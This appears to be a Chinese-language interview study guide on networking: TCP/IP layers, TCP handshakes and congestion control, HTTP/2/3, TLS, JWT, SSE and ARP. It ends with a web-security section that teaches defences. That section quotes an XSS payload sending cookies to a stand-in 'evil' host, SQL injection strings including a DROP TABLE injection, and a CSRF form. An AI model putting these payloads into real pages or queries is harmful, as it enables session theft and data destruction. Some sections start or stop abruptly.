01网络分层模型 —— 千层蛋糕

网络之所以分层，是为了让每一层只操心自己那摊事，把下面一层当成一根「管道」用。常见两套模型：学院派的 OSI 七层，以及互联网实际跑的、更务实的 TCP/IP 四层。

TCP/IP（四层）≈ OSI职责例子
应用层应用层 + 表示层 + 会话层数据「是什么意思」HTTP、DNS、TLS、WebSocket
传输层传输层进程间的端到端传输（靠端口）TCP、UDP
网络层网络层跨网络把分组在主机之间路由IP、ICMP（ping）
链路层数据链路层 + 物理层在本地线路上搬运帧以太网、ARP、Wi-Fi
拿寄一封信就能把这四层对上号 —— 从上到下，每下一层都把上一层再包一层（封装）：
  • 应用层（HTTP/DNS）= 你写的信的内容，外加双方约定用同一种语言来读它——也就是「意思」。
  • 传输层（TCP/UDP，端口）= 把信装进信封，写上「交给大楼里的哪个人/部门」（端口 = 哪个进程）。TCP = 挂号信 + 回执（保证送到、丢了重寄）；UDP = 一张明信片（扔出去就不管了）。
  • 网络层（IP）= 信封上的大楼街道地址（IP），由邮政系统一站站路由到对方城市。
  • 链路层（以太网/ARP，MAC）= 真正在两个相邻站点之间跑腿的卡车/邮递员，靠本地的「走哪个门」（MAC）送到下一站；ARP 就是在本地街道上问「这是哪个信箱？」。
要记清各东西住在哪一层：HTTP 在应用层，TCP/UDP 在传输层（用 端口），IP 在网络层（用 IP 地址），而 MAC 地址在链路层。一个常考问题：「Socket 是协议吗？」—— 不是，它是你的应用用来跟传输层打交道的一套 API。

02TCP vs UDP

两大传输层协议。TCP 是可靠、有序、面向连接的「字节流」；UDP 则是发完就不管的「数据报」，几乎没有任何保证 —— 但胜在小巧、快速。

TCPUDP
连接面向连接（先握手）无连接（直接发）
可靠 / 有序是 —— 确认 + 重传 + 排序否 —— 可能丢包、重复、乱序
流量 / 拥塞控制有无
首部20+ 字节8 字节
形态字节流（无消息边界）离散的数据报（保留边界）
适用场景Web、API、文件、数据库 —— 正确性优先DNS、音视频、游戏 —— 速度 > 完美
TCP 像打电话：拨号，双方先「喂？」（握手），还会确认对方听清了（「……对吧？」「嗯」）。UDP 像在房间里大喊一嗓子：即时、不用铺垫 —— 但你永远不知道对方是不是每个字都听清了。
「粘包」这个坑：因为 TCP 是没有消息边界的字节流，两次发送可能粘在一起到达（也可能被拆开）。应用必须自己给消息分帧 —— 用长度前缀、分隔符，或固定长度的记录。UDP 没这个问题（每个数据报就是一条完整消息）。

03TCP 三次握手

在传输任何数据之前，TCP 先建立连接，并双向同步序列号。这个过程需要三条报文：

sequenceDiagram participant C as 客户端 participant S as 服务器 Note over C: CLOSED → SYN_SENT C->>S: ① SYN (seq=x) Note over S: LISTEN → SYN_RCVD S->>C: ② SYN+ACK (seq=y, ack=x+1) Note over C: → ESTABLISHED C->>S: ③ ACK (ack=y+1) Note over S: → ESTABLISHED

为什么是三次，而不是两次？

先讲两个词。「旧（历史）连接」= 来自上一次连接的一个 SYN，它在网络里被延迟了，姗姗来迟才到。RST（reset，复位）= 一种 TCP 报文，意思是「中止——这里没有有效连接」，会立刻把连接拆掉（区别于 FIN 那种优雅关闭）。

第三次握手的存在，主要就是为了应付这种迟到的旧 SYN。三个原因（对应上图的 ① ② ③）：

  1. 拒绝旧的 / 重复的连接 —— 主要原因。假设客户端第一个 ① SYN（seq=90）在网络里卡住了，于是它超时、又发了一个新的 ① SYN（seq=100）。如果那个旧的 seq=90 的 SYN 后来才到达服务器，服务器会回 ② SYN-ACK（ack=91）。客户端一看 ack=91，可自己等的是 101（它发的是 seq=100），就知道这是个过期的旧连接，于是发一个 RST 顶替 ③——服务器把它丢掉，绝不会开出僵尸连接。两次握手没有第三步，服务器就会错误地把这个旧连接建立起来。
  2. 同步双方的序列号。每一方的初始序列号都要被对方确认：① 带上客户端的 seq；② 既确认它、又带上服务器的 seq；③ 确认服务器的 seq。逻辑上是四次确认，但 ② 的 ACK 和 SYN 合进一个包 → 三条报文。（只发两条的话，服务器的 seq 还没被确认。）
  3. 避免浪费资源。若只有两次握手，服务器一看到 SYN 就会建立连接（分配缓冲区）——连重复 / 重传的 SYN 也照建——堆出一大堆没用的半连接。第 ③ 次 ACK 让服务器在真正建立连接前，先确认客户端确实在。
SYN 洪泛（SYN flood）：攻击者发出大量 SYN 却从不回最后那个 ACK，把半连接（SYN）队列塞满。应对手段：SYN cookies（在 ACK 回来之前不分配状态）、加大 backlog，或缩短 SYN-ACK 的重试次数。

握手背后的两个队列

连接建立期间，内核会维护两个队列：

队列装的是进 / 出
半连接队列（SYN 队列）收到 ①、回了 ②，但还没收到 ③ 的连接（处于 SYN_RCVD）① 到达时进队；收到 ③ 时出队
全连接队列（accept 队列）已经建立、正等应用 accept() 取走的连接③ 到达时进队；accept() 取走时出队

如果应用 accept() 太慢，全连接队列被填满，新连接就会被丢弃。SYN flood 攻击的是另一个队列——大量只有 ①、没有 ③ 的请求堆在 SYN 队列里；SYN cookies 能化解它：把连接状态编码进 ② 的序列号，再从回来的 ③ 里重建，所以在 ③ 回来之前不占内存。

握手报文丢失时会怎样

丢的是结果
① SYN客户端超时后重传 SYN（tcp_syn_retries），并指数退避。
② SYN-ACK两边都会重传：客户端重发 ①（它没收到 ②），服务器重发 ②（tcp_synack_retries）。
③ ACK服务器停在 SYN_RCVD、不断重传 ②；客户端（已 ESTABLISHED）会再回一次 ACK——或者它发出的第一段数据顺带把 ACK 带上、自动修复。

04TCP 四次挥手与 TIME_WAIT

关闭连接需要四条报文，因为 TCP 是全双工的 —— 每一方各自独立地关闭自己那个方向。在对方已经发完之后，一方可能还有数据要发完（flush）。

sequenceDiagram participant C as 客户端（主动关闭） participant S as 服务器 C->>S: 1. FIN Note over C: FIN_WAIT_1 S->>C: 2. ACK Note over S: CLOSE_WAIT（可能还要发数据） Note over C: FIN_WAIT_2 S->>C: 3. FIN Note over S: LAST_ACK C->>S: 4. ACK Note over C: TIME_WAIT（等待 2 MSL） Note over C,S: 双方 → CLOSED

这些连接状态的含义

状态哪一方含义
FIN_WAIT_1主动关闭方发出了 FIN，正等它被 ACK。
FIN_WAIT_2主动关闭方我的 FIN 已被确认（我这半边已关）；现在等对方发它的 FIN。
TIME_WAIT主动关闭方收到对方的 FIN、发出了最后那条 ACK，现在等 2 MSL。
CLOSE_WAIT被动关闭方收到了对方的 FIN，但自己还没发完。大量卡在这里 = 程序 bug：忘了 close()。
LAST_ACK被动关闭方发出了自己的 FIN，正等最后那个 ACK。

FIN_WAIT 之所以分 1、2 两个状态，是因为对方的 ACK 和它的 FIN 通常是两条分开的报文 —— 这正是挥手要四步的原因。

为什么握手三次、挥手却要四次？建连时，服务器的 SYN 和 ACK 可以合并进一个包。关闭时，服务器对你 FIN 的 ACK 和它自己的 FIN 通常没法合并 —— 它要立刻回 ACK，但在发自己的 FIN 之前可能还有数据要发，所以两者得分开。
为什么要有 TIME_WAIT，又为什么是 2× MSL？主动关闭的一方在彻底关闭前会等约 2 倍 MSL（Maximum Segment Lifetime，报文最大生存时间）：
  1. 主动关闭方发出的最后一条报文，本身就是一个 ACK（用来确认对方的 FIN）—— 它不是在等别人给它发 ACK。万一这条 ACK 丢了，对方（还在 LAST_ACK 苦等它）就会重传 FIN；2 MSL 正好覆盖一个来回（1 个 MSL 让这条 ACK 被认定为丢失 + 1 个 MSL 让重传的 FIN 回来），保证关闭方还「活着」，能再补发一次这条 ACK。（要是它早早关掉，就只会回一个 RST，对方永远干净关不掉。）
  2. 让本连接残留的旧包在网络里自然消亡。连接是用四元组（本机 IP+端口、对方 IP+端口）来标识的。万一网络里还飘着一个本连接迟到/重传的旧包，而你立刻用同一对端口开了新连接，这个旧包恰好飘到、且 seq 又落在新连接的接收窗口里，就会被当成新连接的合法数据收下 → 数据错乱。等满 2 MSL（MSL = 一个包在网络中能存活的最长时间），旧包必然全部过期死光，复用的端口对才能干净地重新开始。
代价 —— 端口耗尽（顺着这条链看）：每开一个对外连接，本机都要占一个本地源端口，从「临时端口池」里取（总共就几万个）。这个连接主动关闭后，它占的那个本地端口要在 TIME_WAIT 里压住约 2 MSL（1~4 分钟）才能再用。于是一台疯狂开关大量短连接的机器（典型是一个服务频繁去调后端），就会堆出越来越多的 TIME_WAIT，把几万个临时端口慢慢占光 → 最终开不出新的对外连接。解法是别开得这么频繁——用长连接（keep-alive）/ 连接池复用连接，而不是盲目把 TIME_WAIT 关掉（它是为正确性而存在的）。（这主要影响主动发起连接的那一方 —— 比如一台「对外当客户端去调后端」的服务器 —— 而不是一个单纯的监听端口。）

05TCP 如何保证可靠（且「懂礼貌」）

TCP 在不可靠的 IP 之上叠加了好几套机制：

排序与丢包

序列号给字节排序、检测缺口/重复；接收方回 ACK（确认号）；未被确认的数据会被重传（超时重传，或收到 3 个重复 ACK 后触发快重传）。

流量控制

接收方通告一个窗口（rwnd）—— 「我还剩这么多缓冲区」—— 这样发得快的一方就不会压垮慢的接收方。滑动窗口让大量字节可以同时在途，不必每个包都等确认。

拥塞控制 —— 别把网络给「冲垮」

流量控制保护的是接收方；拥塞控制保护的是网络本身。发送方维护一个拥塞窗口（cwnd），不断试探网络容量：

下面会用到的术语

术语含义
MSS · 最大段大小一个 TCP 段能装的最大数据量（以太网上约 1460 字节）。cwnd、ssthresh 都以「多少个 MSS」来计。
RTT · 往返时延一个包发出去、到它的 ACK 回来的这段时间。
cwnd · 拥塞窗口发送方自己估的「当前最多能往网络里塞多少未确认数据」。
ssthresh · 慢启动阈值两个阶段的分界：cwnd 没到它就指数涨，到了就线性涨。
rwnd · 接收窗口接收方通告的剩余缓冲。发送方实际取 min(cwnd, rwnd)。
  1. 慢启动：cwnd 从 1 个 MSS 起，每收到一个 ACK 就 +1 —— 于是大约每个 RTT 翻一倍（指数增长），直到达到阈值 ssthresh。
  2. 拥塞避免：越过 ssthresh 后温和增长 —— 每个 ACK 加 1/cwnd，也就是大约每个 RTT +1 个 MSS（线性）。
  3. 遇到丢包 —— 分两种：超时被当作严重信号 → ssthresh = cwnd/2，cwnd 直接掉回 1（重新慢启动）。3 个重复 ACK 则温和得多（说明包还在送达）→ ssthresh = cwnd/2，然后 cwnd = ssthresh + 3（快重传 + 快恢复），之后回到拥塞避免，而不是慢启动。
上面两点，拆开讲。「每个 ACK 加 1/cwnd」只是为了凑出「每个 RTT +1 个 MSS」：一个 RTT 大约发 cwnd 个包、收 cwnd 个 ACK，每个加 1/cwnd，整轮加起来正好 +1 个 MSS（对比慢启动：每个 ACK 加 1 → 每个 RTT +cwnd → 翻倍）。重复 ACK 是什么：TCP 的 ACK 是累计确认——一个 ACK 表示「N 之前的我都收到了，下一个请发 N」。如果第 N 个包丢了、但 N+1、N+2、N+3 照样到了，接收方每收到一个失序包就再重复一次同样的「请发 N」——这就是重复 ACK。所以连收 3 个重复 ACK意味着：第 N 个包丢了，但后面的包还在陆续到达（正是它们制造了这些重复）——管道还通，补发那一个缺口就行（快重传）。而超时是什么回音都收不到——可能整条路都堵死了，所以 cwnd 直接掉回 1。

怎么发现对端已经死了 —— TCP keepalive vs HTTP keep-alive

有两个毫不相干的机制都叫「keep-alive」：

TCP keepalive（保活）HTTP keep-alive（长连接）
所在层传输层（操作系统）应用层（HTTP）
目的探测连接是不是死了：长时间空闲后 OS 发探测包；连发几个都没回应 → 把连接断掉让 TCP 连接别关、复用它发更多请求（Connection: keep-alive），免得每次都重新握手
参数tcp_keepalive_time / _intvl / _probes + 套接字选项 SO_KEEPALIVEkeepalive_timeout（比如 Nginx 里）

TCP keepalive 默认要空闲约 2 小时才开始探测，对多数应用太慢，所以服务通常自己加一层应用层心跳（定期 ping/pong），几秒内就能发现对端死掉。

06HTTP 基础

5xx服务端错误500 Internal Server Error（服务器自己出了 bug/崩了）· 502 Bad Gateway（网关从上游收到了无效响应）· 503 Service Unavailable（过载或停机维护）· 504 Gateway Timeout（上游没及时回应）
301 vs 302、307/308、502 vs 504 都是面试心头好。301 = 永久（浏览器会缓存新 URL），302 = 临时。307/308 是严格版，会保留方法和请求体（301/302 历史上允许客户端把 POST 改成 GET；308 ≈ 301，307 ≈ 302）。502 = 网关从上游收到了坏响应；504 = 上游没能及时回应。

HTTP 怎么知道一条消息到哪儿结束

HTTP 跑在 TCP 的字节流上，所以接收方需要一个规则来界定响应体的结尾：

  • Content-Length —— 发送方先声明响应体的确切字节数；接收方就读这么多字节。
  • Transfer-Encoding: chunked（分块传输）—— 事先不知道大小时（流式）：响应体按「带长度前缀的块」一块块发，最后用一个长度为 0 的块收尾。

为什么需要这套机制 ——「粘包」问题。TCP 是纯粹的字节流：它保证字节按序到达，但完全不记「一条消息到哪儿结束、下一条从哪儿开始」。所以你分两次发出去的两个响应，可能黏在一次读取里一起到来；一个响应也可能被拆到好几次读取里（粘包 / 拆包）。TCP 不会帮你解决——它根本没有「一条消息」这个概念。于是只能由应用层协议自己标出边界，也就是上面 Content-Length 和 chunked 在做的事。（任何基于 TCP 的协议都有这个问题；UDP 没有，因为每个数据报本身就是一条完整的消息。）

用比喻理解多路复用。HTTP/1.1 像一条单车道：一次只过一辆车（请求）—— 前面那辆慢，后面全堵。HTTP/2 的多路复用把同一条路变成多车道高速：很多车同时跑、各走各的、各自到达。「车道」就是流编号（stream ID）；每辆车被切成贴了标签的小块（帧），于是不同车道的车能在一条线上交错传，对端再按编号拼回去。（坑：所有车道仍共用同一条 TCP 连接，所以一个 TCP 包丢了就卡住所有车道 —— 这就是 TCP 层队头阻塞，得靠 HTTP/3 才解决。）

一条 TCP 连接怎么同时传多条流（以及 1.1 为什么不行）

HTTP/1.1 里，一条消息是一整块连续的文本，每一块上没有任何标签 —— 所以同一条连接上只能一个响应发完再发下一个；把两个响应的字节混着发，接收方就分不清谁是谁了。（流水线能把多个请求连发，但响应还是只能整条、按顺序回来 → 队头阻塞。）

HTTP/2 的窍门 —— 二进制分帧 + 流编号：

  1. 把每条消息切成一个个二进制小帧。
  2. 给每个帧的帧头打上流编号（stream ID）（「我属于第 3 号流」）。
  3. 于是不同流的帧可以在同一条连接上交错着发。
  4. 接收方按流编号归位 —— 1 号流的帧拼成响应 A，3 号流的拼成响应 B……
一条 TCP 连接发出  S1S3S1S5S3S1 …
每个方块 = 一个帧，带着自己的流编号。接收方按编号分拣 → S1 = 响应 A · S3 = 响应 B · S5 = 响应 C。HTTP/1.1 的数据块没有这个标签，所以不能混着发。

所以全部秘密就是每个帧上的那个标签。要加上它，就得把线上的格式从纯文本改成带帧头的二进制 —— 这正是 HTTP/2 做的事。而这一切都跑在 TCP 之上，TCP 仍然严格按字节顺序交付 —— 所以一个 TCP 包丢了，就会卡住所有流直到它重传（TCP 层队头阻塞，这也是 HTTP/3 把「流」下沉到 QUIC 的原因）。

QUIC 是什么 —— 以及 HTTP/3 为什么要甩掉 TCP

QUIC（是个名字，不是缩写）是一个搭在 UDP 之上的新传输协议。所以整个栈变了：HTTP/1.1 和 HTTP/2 跑在 TCP 上；HTTP/3 不再用 TCP，改跑在 QUIC → UDP 上。为什么挑 UDP？因为 TCP 的「严格按序交付」—— 正是它造成了 TCP 层队头阻塞 —— 是写死在操作系统内核里的、改不动。而 UDP 是个极简的「只管发包，不排序、不保证可靠」的协议，于是 QUIC 把它当成一张白纸，在上面重新造出可靠传输、拥塞控制、多条流、以及 TLS —— 全在用户态实现，怎么好怎么来。

08HTTPS 与 TLS

HTTPS = HTTP over TLS。纯 HTTP 是明文的 —— 链路上任何人都能读取或篡改（中间人攻击，MITM）。TLS 补上三样东西：加密（保密性）、完整性（防篡改），以及身份认证（凭服务器的证书，确认你真的在跟它对话）。

sequenceDiagram participant C as 客户端 participant S as 服务器 C->>S: ClientHello（TLS 版本、加密套件列表、客户端随机数） S->>C: ServerHello（选定的加密套件、服务器随机数）+ 证书 Note over C: 校验证书 —— 证书里带着服务器的公钥 Note over C,S: 🔑 这一步是非对称 —— 在公开线路上安全商定一个秘密 C->>S: 密钥交换 —— (RSA) 用服务器公钥加密一个预主密钥发过去 Note over C,S: 双方据此推出同一把会话密钥（客户端随机数 + 服务器随机数 + 预主密钥） C->>S: Finished（已加密） S->>C: Finished（已加密） Note over C,S: 🔒 从这里开始是对称 —— 所有数据用这把又快的会话密钥（AES）
RSA 密钥交换，一步步看 —— 这就是「非对称 → 对称」的交接：
  1. 服务器的证书里带着它的公钥。
  2. 客户端生成一个全新的随机预主密钥（pre-master）（每个会话各选自己的），用服务器的公钥加密后发过去。
  3. 传输中安全：只有服务器的私钥能解开它，所以偷听者就算把这条消息复制走，也什么都得不到。
  4. 服务器用私钥解开 —— 此时双方都拿到了这个预主密钥。
  5. 双方据它（+ 客户端随机数 + 服务器随机数）推出同一把会话密钥，之后所有真正的数据都改用又快的对称加密（AES）。

对称 vs 非对称 —— 到底是什么

对称加密（symmetric）非对称加密（asymmetric）
钥匙一把共享密钥 —— 加密、解密用同一把一对：公钥 + 私钥（数学上配对）
规则同一把钥匙锁、也用它开用公钥加密 → 只有配对的私钥能解（反方向则用于签名）
速度快慢
关键点难点：怎么在公开线路上把这把钥匙安全交给对方、不被偷看？能让陌生人在公开线路上把秘密安全送给你 —— 只有你的私钥能打开
例子AESRSA、ECDHE
非对称 = 一个带投信口的信箱：谁都能往里投信（用公钥加密），但只有箱主的钥匙能打开（私钥）。你用它投一次，把「共享挂锁的密码」递给箱主；之后你俩就改用那把又快的共享挂锁（对称）。
为什么对称、非对称都要用？非对称加密（RSA/ECDHE）慢，但能让两个素未谋面的人在公开线路上协商出一个秘密；对称加密（AES）快。所以 TLS 只用非对称加密来交换一把共享密钥，之后用快速的对称加密来加密真正的数据。
RSA vs ECDHE 密钥交换 ——「前向保密」：用传统 RSA 时，客户端用服务器的公钥加密一个预主密钥（pre-master）发过去；双方再用 客户端随机数 + 服务器随机数 + 预主密钥 推出会话密钥。风险是：服务器私钥一旦哪天泄漏，之前录下的流量都能被解开 —— 没有前向保密。ECDHE 改为交换临时的 Diffie-Hellman 参数（证书只负责给它们签名），于是每次会话的密钥相互独立，日后私钥泄漏也解不开旧会话 —— 有前向保密。TLS 1.3 干脆移除了 RSA 密钥交换（只用 ECDHE），而且是 1-RTT。
证书是怎么挡住中间人的？服务器的证书由你的操作系统/浏览器已经信任的 CA 签名。攻击者可以复制这张证书，但伪造不出 CA 对他自己那把密钥的签名；他也无法在拿不到对应私钥的情况下出示真证书 —— 于是校验（或密钥交换）会失败。整条信任链（根 CA → 中间 CA → 站点）就是信任的锚点。

Payload（载荷）声明（claims）：谁（用户 id）、有什么（角色）、什么时候（exp 过期、iat 签发时间）…令牌真正携带的、关于用户的数据。
Signature（签名）HMAC(base64(header) + "." + base64(payload), secret)证明 header+payload 没被篡改 —— 只有握着密钥（secret）的人才算得出它。

服务器怎么信任它（无需查库）：它用自己的密钥，拿收到的 header+payload 重新算一遍签名；只要算出来的和令牌里那段签名一致，就说明令牌是真的、没被改过 → 于是信任 payload 里的内容。编码 ≠ 加密：任何人都能把 header、payload base64 解码后直接读到 —— 签名只能验出"有没有被改"，并不会把内容藏起来。所以千万别把机密（密码等）放进 payload。

JWT 最棘手的是「吊销」。因为它无状态，在令牌过期之前，你没法在服务端「把某人踢下线」。应对办法：把有效期设得短一点 + 配合刷新令牌（refresh token），或者在服务端维护一份黑名单（但这又把状态请回来了）。经典权衡：Session 易于吊销，但需要共享存储；JWT 能无状态扩展，却难以吊销。
Cookie vs localStorage：Cookie 会自动发给服务器（还能设 HttpOnly 让 JS 读不到 → 对 XSS 更安全）；localStorage 容量更大（约 5MB），从不自动发送，但页面上的任何 JS 都能读到它。把 JWT 存在 HttpOnly 的 Cookie 里 + 加上 CSRF 防护，或者放在内存中 —— 能避免的话，就别裸放在 localStorage 里。

SSE 是怎么自动重连的

重连是浏览器 EventSource 内置的，你一行都不用写：

  • 流断了，浏览器会隔一会儿自动重连 —— 服务器可以用 retry: 5000 字段（毫秒）设这个间隔。
  • 服务器给每条事件打上 id:。重连时浏览器会把最后收到的那个 id 放进 Last-Event-ID 请求头带回去，服务器据此从断点接着发 —— 不漏事件。

为什么 POST + Authorization（上图那两个 ❌）这么关键：

  • POST 用来装 prompt。一次 LLM 调用要发很多东西 —— 完整 prompt、整段对话历史、system 消息、工具定义、各种参数 —— 几 KB 到几 MB 的 JSON。这些只能放进请求体（body），而 GET 没有 body。（硬塞进 URL 会撞上约 2–8 KB 的长度上限，还会把内容泄进每一条服务器/代理日志。）EventSource 只能 GET → 它根本发不出 prompt。

fetch / EventSource 是你写的 JavaScript；图里那条 POST … 是这段代码产生出来的 HTTP 请求。method（GET/POST）是请求的一个属性 —— 而你能不能自由设它，取决于你用哪个 API：

// fetch —— method / 头 / body 都由你定 fetch('/v1/chat/completions', { method: 'POST', headers: { Authorization: 'Bearer sk-...' }, body: JSON.stringify({ messages, model, stream: true }) }) // → 产生图里那条 POST ✅
// EventSource —— 只能给个 URL，别的都没有 new EventSource('/v1/chat/completions') // → 永远 GET · 没有头 · 没有 body → prompt 和 key 都带不上 ❌

一句话：用 fetch 时 method / 头 / body 都由你定，所以能 POST 发 prompt、能带 key。EventSource 被锁死成 GET、没头、没 body —— 所以"换成 GET 不就行了"并不是改一个词的事：GET 没有 body，prompt 根本无处可放。

SSE 真正的代价（面试值得点出来）：

  • HTTP/1.1 连接数上限 —— 浏览器对每个域名只允许约 6 条连接，开多个标签页就会排队；HTTP/2 多路复用解决了这点。
  • 只能文本 —— 二进制必须 base64 编码（体积 +33%）。
  • 重连缝隙 —— 旧流关闭、新 POST 还没开的那一瞬间，事件可能丢，除非你记着 id 来续传。

那为什么不干脆一直用 WebSocket？因为它会把连接钉死在某一台服务器上，要横向扩展就得加一层 Redis 发布/订阅来扇出消息（更高延迟），而且企业的代理 / 防火墙经常直接拒掉 Upgrade 握手。对单向文本流来说，这纯属有成本没收益。

LLM 专属的一招 —— 语义缓存

普通缓存按精确字符串匹配命中。语义缓存则把问题嵌入成向量、按相似度匹配，于是「怎么重置密码？」和「我忘了密码该怎么办？」会命中同一条缓存答案 —— 直接跳过模型调用（更便宜 + 秒回）。

  • 相似度阈值是关键旋钮：调太高（0.99）几乎什么都匹配不上；调太低（0.7）会返回错答案。通常取 0.85–0.95。
  • 按时效设 TTL —— 易变的事实（天气、股价）几分钟就过期；稳定的 FAQ 可以存上几天。
它不只是个负载均衡器：通用 API 网关做不了 token 预算、语义缓存、按模型的成本归因 —— 这些 LLM 专属需求才是它存在的理由。常见实现：LiteLLM（Python，100+ 模型）、One API（Go）、Portkey、Bifrost（Rust）。

第 3 步细看 —— ARP（Address Resolution Protocol，地址解析协议；找下一跳的 MAC）

要把包放上线路，链路层需要下一跳的 MAC 地址。目标服务器在外网，所以下一跳是你的网关（路由器） —— 你知道它的 IP（网络配置里有），但不知道它的 MAC。ARP 就负责在本地网把 IP 解析成 MAC：

  1. 先查本机 ARP 缓存 —— 网关的 MAC 在里面就直接用。
  2. 没有就广播一条 ARP 请求到 ff:ff:ff:ff:ff:ff（本地所有设备都收到）：「谁是 192.168.1.1？告诉 192.168.1.50」。
  3. 网关（它就是那个 IP）单播回一条 ARP 应答：「192.168.1.1 在 aa:bb:cc:dd:ee:ff」。
  4. 你把它缓存下来，把以太网帧的目标 MAC 填成网关的，发出去 —— 路由器再把你的包往下一跳转。

关键：ARP 只在本地网段有效（它是广播）。对远程服务器，你 ARP 的是网关的 MAC、不是服务器的 —— 目标 IP 始终是服务器，但每一跳的以太网帧用的是"下一跳"的 MAC。

按分层顺序一路答下去，这题你就永远不会卡壳：DNS（应用层）→ TCP 握手（传输层）→ TLS → HTTP 请求/响应 → 渲染。加分项：提一提 DNS 各级的缓存、用 ARP 拿到本地 MAC，以及用长连接（keep-alive）复用 TCP 连接来加载后续资源。

XSS 的三种类型：存储型 —— 攻击载荷被存到服务器、再发给其他用户（比如一条恶意评论）。反射型 —— 载荷从请求里被原样「回显」回来（比如 URL 里的搜索词）。DOM 型 —— 客户端 JS 把攻击者输入写进了页面；服务器根本没见过它，所以服务端的输出编码拦不住，必须在 JS 里也做净化。

XSS —— 怎么打的，防御又怎么挡住

攻击：页面把用户输入不转义就渲染 —— 比如一条被存下来的评论 <script>fetch('//evil/?c='+document.cookie)</script>，会在每个浏览它的人的浏览器里执行，偷走他们的 Cookie/会话，或冒充他们操作。防御：

  • 输出编码 / 转义（output encoding / escaping） —— 把用户数据插进页面时，把 < > & " ' 转成 HTML 实体，让浏览器把它当成文本渲染，而不是标签或脚本。最重要的一道防线 —— 而且要分上下文（插进 HTML 正文、属性、内联 JS、URL 的转义方式各不相同）。
  • 内容安全策略（Content-Security-Policy, CSP） —— 一个响应头，白名单限定脚本只能从哪里加载（如 script-src 'self'）。就算攻击者注入了 <script>，浏览器也拒绝执行内联或外域代码 —— 编码万一漏了，这是一张安全网。
  • HttpOnly Cookie —— 把会话 Cookie 标记为 JS 读不到，这样注入的脚本就没法用 document.cookie 偷走它。
  • 输入校验 / 净化（input validation / sanitization） —— 数据进来时就拒绝或剥掉危险标记（富文本就上一个白名单式的 HTML 净化器）。DOM 型 XSS 还必须在客户端 JS 里也净化，因为服务器根本见不到这份数据。

CSRF —— 怎么打的，防御又怎么挡住

攻击：你正登录着银行；一个恶意页面自动提交一个隐藏的 <form action="bank.com/transfer" method="POST"> —— 浏览器会带上你的银行 Cookie，于是转账成功。攻击者根本不看响应，他只要这个副作用被触发就够了。防御：

  • SameSite Cookie —— SameSite=Lax（如今浏览器的默认值）或 Strict 告诉浏览器：跨站请求不要带上这个 Cookie。Cookie 搭不了顺风车 → 伪造的请求就是未登录态。最强也最简单的防御。
  • CSRF 令牌（CSRF token） —— 服务器在每个表单/页面里塞一个随机的、每会话独有的秘密令牌；真实请求会把它回传，而攻击者的跨站页面读不到它（同源策略挡住了）。令牌缺失或不对 → 拒绝。也叫「同步令牌（synchronizer token）」模式。
  • 校验 Origin / Referer —— 服务器检查请求的 Origin/Referer 头是不是自己的域名。兜底手段，因为这俩头有时会缺失。

SQL 注入 —— 怎么打的，怎么挡

攻击：代码用字符串拼接来拼查询："SELECT * FROM users WHERE name='" + input + "'"。输入 ' OR '1'='1 让 WHERE 恒为真（绕过登录）；输入 '; DROP TABLE users;-- 则夹带进第二条语句。防御：

  • 参数化查询 / 预编译语句（parameterized queries / prepared statements） —— 把 SQL 和数据分开发送；驱动会把值当成纯数据绑定、绝不当成可执行的 SQL，所以输入里的引号没法「逃逸」出来。这是真正能根治的一招。
  • 最小权限的数据库账号（least-privilege） —— 应用账号不能 DROP 或改表结构，万一漏了也能把波及面缩到最小。
  • 输入校验 + ORM —— 类型/白名单校验，以及默认就做参数化的 ORM，能加一层纵深 —— 但替代不了预编译语句。

DDoS —— 怎么打的，怎么挡

攻击：僵尸网络（成千上万台被控机器）用洪水般的流量耗尽某种资源 —— 带宽（流量型：UDP/ICMP 洪水）、连接状态（SYN 洪水 —— 大量半开握手）、或 CPU（昂贵请求）。目的：让正常用户挤不进来。防御：

  • 限流（rate limiting） —— 按 IP / 令牌 / 路由限制请求数，别让单一来源独占容量。
  • CDN + Anycast —— 用靠近攻击者、远离源站的大量边缘节点把洪水吸收并分摊掉。
  • WAF / 清洗（scrubbing） —— 一道过滤器，丢掉恶意流量模式；厂商（Cloudflare 等）先「清洗」洪水、只把干净流量转给你。
  • 自动扩容 + 黑洞（blackhole） —— 负载升高就横向扩容；万不得已时，把被攻击的 IP 路由到空路由（「黑洞」）以保住其余一切。
  • SYN cookies —— 专门对付 SYN 洪水：服务器把连接状态编码进 SYN-ACK 里、而不分配内存，这样半开队列就填不满。

DNS 劫持 —— 怎么打的，怎么挡

攻击：攻击者伪造一条 DNS 应答、或污染解析器的缓存，让某个域名（bank.com）解析到他自己的 IP；受害者输的是对的域名，却落到一个仿冒的钓鱼站。防御：

  • DNSSEC —— 记录带密码学签名，解析器能验证答案是真的、没被改过，从而拒绝伪造的应答。
  • DoT / DoH —— DNS over TLS / over HTTPS 把查询加密，路径上的攻击者读不到也改不了。
  • 可信解析器 —— 用信誉好的解析器，并护好自己的路由器/DNS 设置（这是常见的劫持点）。
  • HTTPS + 证书校验是最后一道防线 —— 就算 DNS 被骗了，仿冒站也拿不出真域名的有效证书，浏览器会报警。
XSS vs CSRF 一句话：XSS = 网站错误地信任了数据（执行了注入的脚本）；CSRF = 网站错误地信任了浏览器/Cookie（对伪造的请求照做不误）。XSS 的防御 = 输出编码 + CSP；CSRF 的防御 = 令牌 + SameSite。注意：一个 XSS 漏洞能击穿大多数 CSRF 防御，所以先修 XSS。

分层

应用层（HTTP/DNS/TLS）· 传输层（TCP/UDP，端口）· 网络层（IP）· 链路层（以太网/ARP，MAC）。

TCP

三次握手（双向同步序列号）、四次挥手（全双工）、TIME_WAIT = 2 MSL。靠序列号/确认号/重传保证可靠；流量控制 = rwnd；拥塞控制 = cwnd（慢启动 → 拥塞避免 → 快恢复）。

TCP vs UDP

TCP = 可靠有序的字节流（Web/数据库）。UDP = 快速无连接的数据报（DNS/视频/游戏）。

HTTP

无状态的请求/响应。2xx 成功 · 3xx 重定向 · 4xx 客户端错误 · 5xx 服务端错误。1.1 长连接 → 2 多路复用/HPACK → 3 QUIC（无 TCP 队头阻塞）。

HTTPS

HTTP+TLS：非对称加密换密钥，对称加密传数据；由受信任 CA 签名的证书挡住中间人。

状态与实时

Session = 有状态（共享存储）。JWT = 无状态（带签名，难吊销）。SSE = 服务器→客户端推送。WebSocket = 全双工。

第三次握手的 ACK 丢了 —— 会发生什么？ 中等
客户端认为自己已 ESTABLISHED（它发了 ACK）；服务器仍在 SYN_RCVD 状态，于是重传它的 SYN-ACK（最多重传 tcp_synack_retries 次）。当客户端再次回应（补发 ACK，或发送数据——数据本身也带 ACK）时，服务器进入 ESTABLISHED。如果客户端开始发数据，那段数据会捎带上 ACK，立刻把状态修正过来。
一台服务器上有几万个套接字卡在 TIME_WAIT。原因和解法？ 困难
